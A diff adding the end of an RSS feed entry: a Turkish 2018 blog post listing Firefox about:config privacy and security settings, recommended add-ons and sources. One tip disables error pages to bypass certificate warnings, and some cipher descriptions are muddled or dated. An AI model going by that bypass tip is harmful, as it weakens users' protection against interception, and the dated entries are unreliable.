+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.urlbar.autocomplete.enabled&lt;/code&gt; = Adres çubuğuna yazarken ki otomatik tamamlama önerilerini yapar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde otomatik tamamlama kullanılmayacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.urlbar.maxRichResults&lt;/code&gt; = Adres çubuğundaki dropdown list şeklinde gelen sonuçları tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; olarak değiştirdiğimizde bu sonuçları kapatmış olacağız.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dom.battery.enabled&lt;/code&gt; = Web uygulamalarının mobil cihazlarda pil durumuna erişmesini sağlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dom.event.clipboardevents.enabled&lt;/code&gt; = Web sitelerinin panoya kopyalanmış öğelere erişip erişemeyeceğini belirler. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dom.storage.enabled&lt;/code&gt; = Web uygulamalarının istemciye(client) depolama yapması. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;geo.enabled&lt;/code&gt; = Konum bilgisi. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirimesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;geo.wifi.uri&lt;/code&gt; = Konum bilgisi için veri sağlayıcısı. Varsayılan içerik silinerek &lt;code class=&quot;highlighter-rouge&quot;&gt;boş bırakılması&lt;/code&gt; veya &lt;code class=&quot;highlighter-rouge&quot;&gt;http://localhost&lt;/code&gt; yazılması önerilir.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;media.peerconnection.enabled&lt;/code&gt; = webrtc’nin etkin olup olmadığını belirler. Eğer açıksa VPN kullanımınızda yerel ve uzak ip adresinizi sızdırır. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir. Test için =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.browserleaks.com/webrtc&lt;/code&gt; . Eğer hala zafiyet devam ediyorsa &lt;code class=&quot;highlighter-rouge&quot;&gt;media.peerconnection.turn.disable = true&lt;/code&gt; &amp;amp;&amp;amp; ` media.peerconnection.use_document_iceservers = false&lt;code class=&quot;highlighter-rouge&quot;&gt; &amp;amp;&amp;amp; &lt;/code&gt; media.peerconnection.video.enabled = false&lt;code class=&quot;highlighter-rouge&quot;&gt; &amp;amp;&amp;amp; &lt;/code&gt; media.peerconnection.identity.timeout = 1`  bu değerleri de yazdığım şekilde değiştirebilirsiniz.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;media.video_stats.enabled&lt;/code&gt; = Video oynatma ile ilgili istatistiklerinizi gönderir. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi durumunda istatistiklere erişilemez.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;network.cookie.cookieBehavior&lt;/code&gt; = Çerezlere izin verilip verilmeyeceğini belirler. &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; Tüm çerezlere izin verir. &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; Yalnızca birinci taraf sunucudaki çerezlere izin verir (Önerilen). &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; Tüm çerezleri engeller. &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; Üçüncü taraf çerezlere izin verir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;network.http.referer.spoofSource&lt;/code&gt; = Gerçek veya sahte referer kullanımı tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştirilmesi halinde sahte referrer kullanılacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;network.http.sendRefererHeader&lt;/code&gt; = Header referrer bilgisi. &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; Asla gönderme (önerilen). &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; Tıklandığında gönder. &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; Tıklandığında veya yüklenirken gönder.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;plugin.state.flash&lt;/code&gt; = Flash player eklenti ayarları. &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; Flash eklentisini tamamen kapatır (önerilen). &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; Flash eklentisini aktifleştirmeden önce sor. &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; Flash eklentisine izin verir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;plugin.state.java&lt;/code&gt; = Java eklenti ayarları. &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; Java eklentisini tamamen kapatır (önerilen). &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; Java eklentisini aktifleştirmeden önce sor. &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; Java eklentisine izin verir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.donottrackheader.enabled&lt;/code&gt; = Web sitelerini ve hizmetleri izleme tercihi hakkında bilgilendirme. &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştirildiğinde izleme Headerı etkinleşir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;webgl.disabled&lt;/code&gt; = WebGL özelliğini tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştirdiğimizde bu özellik kapanmış olacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pdfjs.disabled&lt;/code&gt; = PDF dosyalarının okunup okunamayacağını belirler. &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştirdiğimiz takdirde PDF dosyalarını tarayıcımızdan okuyamayacağız.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;plugins.click_to_play&lt;/code&gt; = Tıklama işlemi ile bazı eklentilerin çalıştırılma durumunu tanımlar.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;media.autoplay.enabled&lt;/code&gt; = (HTML5) Videoların otomatik başlama durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services.sync.engine.tabs&lt;/code&gt; = Sekmelerin senkronize edilmesi durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services.sync.engine.prefs&lt;/code&gt; = Ayarların senkronize edilmesi durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirimesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services.sync.engine.passwords&lt;/code&gt; = Parolaların senkronize edilmesi durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services.sync.engine.history&lt;/code&gt; = Geçmişin senkronize edilmesi durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services.sync.engine.bookmarks&lt;/code&gt; = Sık kullanılanların senkronize edilmesi durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services.sync.engine.addons&lt;/code&gt; = Eklentilerin senkronize edilmesi durumunu tanımmlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.chrome.favicon&lt;/code&gt; = faviconların gösterilme durumu. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde gösterilen faviconlar kapanacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;media.eme.enabled&lt;/code&gt; = Şifreli medya ekipmanlarını kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;Tarayıcı sağlık raporlamalarının kapatılması için &lt;code class=&quot;highlighter-rouge&quot;&gt;toolkit.telemetry.enabled&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;datareporting.healthreport.uploadEnabled&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;datareporting.policy.dataSubmissionEnabled&lt;/code&gt; ayarlarının&lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dom.ipc.plugins.flash.subprocess.crashreporter.enabled&lt;/code&gt; = Eklentilerin çökme raporlarını kapatmak için bu ayarı &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirebilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;layout.spellcheckDefault&lt;/code&gt; = Yazılım denetimi durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde denetim kapanacaktır.&lt;/p&gt;
+
+&lt;p&gt;Devre dışı sertifika uyarısını bypass etmek için &lt;code class=&quot;highlighter-rouge&quot;&gt;browser.xul.error_pages.enabled&lt;/code&gt; ayarını &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;security.csp.enable&lt;/code&gt; = İçerik Güvenlik Politikası. &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olduğunda İçerik Güvenlik Politikası desteği etkin durumdadır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.urlbar.filter.javascript&lt;/code&gt; = XSS filtresi.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;plugin.default.state&lt;/code&gt; = Ön tanımlı gelen eklentileri kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; olarak değiştirebilirsiniz. &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;plugin.defaultXpi.state&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Webcam ve Mikrofon kullanımını kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;media.navigator.enabled&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;media.navigator.video.enabled&lt;/code&gt; ayarlarını &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;İzinsiz gezinmeyi kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;network.http.speculative-parallel-limit&lt;/code&gt; ayarını &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;Bilinen takip domainlerini kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.trackingprotection.enabled&lt;/code&gt; ayarını &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;security.tls.version.min&lt;/code&gt; = TLS v1.2 kullanım durumunu tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; olarak değiştirdiğimizde TLS v1.2 kullanmaya zorlamış oluyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;security.ssl3.rsa_aes_256_sha&lt;/code&gt; = ecdhe/dhe chiplerları. Kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;security.ssl3.rsa_des_ede3_sha&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;security.ssl3.rsa_aes_256_sha&lt;/code&gt; kullanılmayan protokolleri &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;extensions.update.enabled&lt;/code&gt; = Eklentilerin otomatik güncellenmesi durumunu tanımlar.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.search.geoip.url&lt;/code&gt; = Ülke bazlı arama motoru yönlendirmesi. Ayarı &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&quot;&lt;/code&gt; olarak değiştirerek yönlendirmeyi kapatıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;network.predictor.enabled&lt;/code&gt; = Necko(https://wiki.mozilla.org/Privacy/Reviews/Necko) özelliğini kapatmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.aboutHomeSnippets.updateUrl&lt;/code&gt; = Snippet sunucusu(https://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections#w_mozilla-content) URL kaldırmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&quot;&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;security.csp.enable&lt;/code&gt; = CSP(https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy) Özelliği. Aktifleştirmek için &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştiriyoruz.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;tarayıcı-kapatıldığında-tüm-verilerin-temizlenmesi-özelliğini-aktif-hale-getirme-işlemitrue-seçeneği-siler-false-seçeneği-silmez&quot;&gt;Tarayıcı kapatıldığında tüm verilerin temizlenmesi özelliğini aktif hale getirme işlemi.(True seçeneği siler False seçeneği silmez)&lt;/h1&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.sanitize.sanitizeOnShutdown&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.cache&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.cookies&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.downloads&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.history&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.offlineApps&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.openWindows&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.passwords&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.siteSettings&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.sessions&lt;/code&gt; &amp;amp;&amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;privacy.clearOnShutdown.formdata&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;kurulması-önerilen-eklentiler&quot;&gt;Kurulması Önerilen Eklentiler&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Random User Agent Spoofer(https://github.com/dillbyrne/random-agent-spoofer)
+
+uBlock Origins(https://github.com/gorhill/uBlock)
+
+Https-Everywhere(https://www.eff.org/https-everywhere%20)
+
+Disconnect(https://addons.mozilla.org/en-US/firefox/addon/disconnect/)
+
+No Youtube Comment(https://addons.mozilla.org/en-US/firefox/addon/no-youtube-comments/)
+
+Self-Destructing Cookies(https://addons.mozilla.org/en-US/firefox/addon/self-destructing-cookies/)
+
+No-Script(https://addons.mozilla.org/en-US/firefox/addon/noscript/)
+
+RequestPolicy(https://addons.mozilla.org/en-US/firefox/addon/requestpolicy-continued/)
+
+SSLeuth(https://addons.mozilla.org/en-US/firefox/addon/ssleuth/)
+
+Privacy Settings(https://addons.mozilla.org/en-US/firefox/addon/privacy-settings/)
+
+Decentraleyes(https://addons.mozilla.org/en-US/firefox/addon/decentraleyes/)
+
+
+https://browserleaks.com/ Tarayıcı üzerinden hangi bilgileri paylaştığınızı bu siteden kontrol edebilirsiniz.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;kaynakça&quot;&gt;Kaynakça&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://gokay.org/firefox-guvenlik-ve-gizlilik/
+https://mertcangokgoz.com/mozilla-firefox-guvenlik-ve-gizlilik-ayarlari/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 21 Jul 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/2018/07/21/firefox.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/07/21/firefox.html</guid>
+        
+        
+        <category>firefox</category>
+        
+      </item>
+    
+  </channel>
+</rss>
